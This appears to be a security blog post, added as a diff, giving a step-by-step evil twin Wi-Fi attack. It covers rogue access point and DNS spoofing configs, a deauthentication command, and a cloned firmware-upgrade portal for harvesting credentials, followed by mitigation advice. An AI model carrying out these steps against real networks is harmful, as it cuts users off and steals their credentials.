@@ -1,0 +1,165 @@
+<h1 id="evil-twin-attack-exploiting-wi-fi-clients-without-additional-hardware"><strong>Evil Twin Attack: Exploiting Wi-Fi Clients Without Additional Hardware</strong></h1>
+
+<h2 id="introduction"><strong>Introduction</strong></h2>
+
+<p>The <strong>Evil Twin Attack</strong> is a sophisticated method of exploiting Wi-Fi clients by creating a rogue access point (AP) that mimics a legitimate one. The goal is to force clients to disconnect from the legitimate network and reconnect to the malicious AP, which has the same SSID. Once connected, the attacker can intercept traffic, redirect users to a fake firmware upgrade page, and harvest credentials or other sensitive information.</p>
+
+<p>This attack can be executed using a Debian-based OS like <strong>Kali Linux</strong> without the need for additional hardware (though an external NIC may improve performance). Below is a step-by-step guide to setting up the attack, followed by mitigation strategies to defend against such exploits.</p>
+
+<hr />
+
+<h2 id="attack-overview"><strong>Attack Overview</strong></h2>
+<ol>
+  <li><strong>Objective</strong>:
+    <ul>
+      <li>Knock Wi-Fi clients off their legitimate network.</li>
+      <li>Force them to reconnect to a rogue AP with the same SSID.</li>
+      <li>Redirect traffic to a fake firmware upgrade portal to harvest credentials.</li>
+    </ul>
+  </li>
+  <li><strong>Tools</strong>:
+    <ul>
+      <li><code class="language-plaintext highlighter-rouge">hostapd</code>: For creating the rogue AP.</li>
+      <li><code class="language-plaintext highlighter-rouge">dnsmasq</code>: For DHCP and DNS spoofing.</li>
+      <li><code class="language-plaintext highlighter-rouge">apache2/nginx</code>: For hosting the fake portal.</li>
+      <li><code class="language-plaintext highlighter-rouge">iptables</code>: For traffic redirection.</li>
+      <li><code class="language-plaintext highlighter-rouge">aireplay-ng</code>: For deauthentication attacks.</li>
+    </ul>
+  </li>
+  <li><strong>Prerequisites</strong>:
+    <ul>
+      <li>A wireless interface in monitor mode.</li>
+      <li>Basic knowledge of networking, social engineering, and web development.</li>
+    </ul>
+  </li>
+</ol>
+
+<hr />
+
+<h2 id="step-by-step-execution"><strong>Step-by-Step Execution</strong></h2>
+
+<h3 id="1-install-required-tools"><strong>1. Install Required Tools</strong></h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>apt <span class="nb">install </span>hostapd dnsmasq apache2
+</code></pre></div></div>
+
+<h3 id="2-set-wireless-interface-to-monitor-mode"><strong>2. Set Wireless Interface to Monitor Mode</strong></h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>iwconfig <span class="o">[</span>iface] mode monitor
+</code></pre></div></div>
+
+<h3 id="3-create-working-directory"><strong>3. Create Working Directory</strong></h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">mkdir </span>evil-twin <span class="o">&amp;&amp;</span> <span class="nb">cd </span>evil-twin
+</code></pre></div></div>
+
+<h3 id="4-configure-hostapd"><strong>4. Configure <code class="language-plaintext highlighter-rouge">hostapd</code></strong></h3>
+<p>Create <code class="language-plaintext highlighter-rouge">hostapd.conf</code>:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vim hostapd.conf
+</code></pre></div></div>
+<p>Configuration:</p>
+<div class="language-ini highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="py">interface</span> <span class="p">=</span> <span class="s">[iface]</span>
+<span class="py">driver</span> <span class="p">=</span> <span class="s">nl80211</span>
+<span class="py">ssid</span> <span class="p">=</span> <span class="s">[ESSID of target]</span>
+<span class="py">hw_mode</span> <span class="p">=</span> <span class="s">g</span>
+<span class="py">channel</span> <span class="p">=</span> <span class="s">[channel of target]</span>
+<span class="py">macaddr_acl</span> <span class="p">=</span> <span class="s">0</span>
+<span class="py">ignore_broadcast_ssid</span> <span class="p">=</span> <span class="s">0</span>
+</code></pre></div></div>
+
+<h3 id="5-configure-dnsmasq"><strong>5. Configure <code class="language-plaintext highlighter-rouge">dnsmasq</code></strong></h3>
+<p>Create <code class="language-plaintext highlighter-rouge">dnsmasq.conf</code>:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vim dnsmasq.conf
+</code></pre></div></div>
+<p>Configuration:</p>
+<div class="language-ini highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="py">interface</span> <span class="p">=</span> <span class="s">[iface]</span>
+<span class="py">dhcp-range</span> <span class="p">=</span> <span class="s">192.168.1.2, 192.168.1.30, 255.255.255.0, 12h</span>
+<span class="py">dhcp-option</span><span class="p">=</span><span class="s">3, 192.168.1.1</span>
+<span class="py">dhcp-option</span><span class="p">=</span><span class="s">6, 192.168.1.1</span>
+<span class="py">server</span> <span class="p">=</span> <span class="s">8.8.8.8</span>
+<span class="err">log-queries</span>
+<span class="err">log-dhcp</span>
+<span class="py">listen-address</span><span class="p">=</span><span class="s">127.0.0.1</span>
+</code></pre></div></div>
+
+<h3 id="6-configure-network-interface"><strong>6. Configure Network Interface</strong></h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ifconfig <span class="o">[</span>iface] up 192.168.1.1 netmask 255.255.255.0
+</code></pre></div></div>
+
+<h3 id="7-add-routing-rules"><strong>7. Add Routing Rules</strong></h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>route add <span class="nt">-net</span> 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
+</code></pre></div></div>
+
+<h3 id="8-set-up-ip-tables-for-traffic-redirection"><strong>8. Set Up IP Tables for Traffic Redirection</strong></h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>iptables <span class="nt">--table</span> nat <span class="nt">--append</span> PREROUTING <span class="nt">-i</span> <span class="o">[</span>iface] <span class="nt">-p</span> tcp <span class="nt">-j</span> REDIRECT <span class="nt">--to-ports</span> &lt;ports running your portal&gt;
+</code></pre></div></div>
+
+<h3 id="9-set-up-the-fake-portal"><strong>9. Set Up the Fake Portal</strong></h3>
+<ul>
+  <li>Use tools like <code class="language-plaintext highlighter-rouge">httrack</code> to clone a legitimate firmware upgrade page.</li>
+  <li>Modify the HTML/CSS to make it convincing.</li>
+  <li>Set up a backend (e.g., Flask, Node.js) to handle user input.</li>
+  <li>Save credentials to a database or file.</li>
+</ul>
+
+<h3 id="10-start-services"><strong>10. Start Services</strong></h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hostapd hostapd.conf
+dnsmasq <span class="nt">-C</span> dnsmasq.conf <span class="nt">-d</span>
+dnsspoof <span class="nt">-i</span> <span class="o">[</span>iface]
+</code></pre></div></div>
+
+<h3 id="11-launch-deauthentication-attack"><strong>11. Launch Deauthentication Attack</strong></h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aireplay-ng <span class="nt">--deauth</span> 0 <span class="nt">-a</span> <span class="o">[</span>victim<span class="s1">'s BSSID] [iface]
+</span></code></pre></div></div>
+
+<hr />
+
+<h2 id="mitigation-strategies"><strong>Mitigation Strategies</strong></h2>
+
+<h3 id="1-use-strong-encryption"><strong>1. Use Strong Encryption</strong></h3>
+<ul>
+  <li>Ensure your Wi-Fi network uses <strong>WPA3</strong> encryption. If WPA3 is unavailable, use <strong>WPA2</strong> with a strong passphrase.</li>
+</ul>
+
+<h3 id="2-monitor-for-rogue-aps"><strong>2. Monitor for Rogue APs</strong></h3>
+<ul>
+  <li>Deploy wireless intrusion detection systems (WIDS) to detect and alert on rogue APs.</li>
+</ul>
+
+<h3 id="3-implement-certificate-based-authentication"><strong>3. Implement Certificate-Based Authentication</strong></h3>
+<ul>
+  <li>Use <strong>802.1X/EAP</strong> to authenticate devices connecting to your network. This prevents unauthorized devices from joining, even if they have the correct SSID and password.</li>
+</ul>
+
+<h3 id="4-educate-users"><strong>4. Educate Users</strong></h3>
+<ul>
+  <li>Train users to recognize suspicious activity, such as unexpected firmware upgrade prompts or certificate warnings.</li>
+</ul>
+
+<h3 id="5-disable-auto-reconnect"><strong>5. Disable Auto-Reconnect</strong></h3>
+<ul>
+  <li>Configure devices to <strong>not auto-reconnect</strong> to known networks without user confirmation.</li>
+</ul>
+
+<h3 id="6-regularly-update-firmware"><strong>6. Regularly Update Firmware</strong></h3>
+<ul>
+  <li>Ensure all network devices are running the latest firmware to patch known vulnerabilities.</li>
+</ul>
+
+<h3 id="7-segment-your-network"><strong>7. Segment Your Network</strong></h3>
+<ul>
+  <li>Use VLANs to isolate sensitive devices and services from the rest of the network.</li>
+</ul>
+
+<h3 id="8-monitor-network-traffic"><strong>8. Monitor Network Traffic</strong></h3>
+<ul>
+  <li>Use tools like <strong>Wireshark</strong> or <strong>Zeek</strong> to analyze network traffic for anomalies.</li>
+</ul>
+
+<h3 id="9-enable-https-everywhere"><strong>9. Enable HTTPS Everywhere</strong></h3>
+<ul>
+  <li>Ensure all web-based services use HTTPS to prevent traffic interception.</li>
+</ul>
+
+<h3 id="10-deploy-honeypots"><strong>10. Deploy Honeypots</strong></h3>
+<ul>
+  <li>Set up honeypot APs to detect and analyze malicious activity.</li>
+</ul>
+
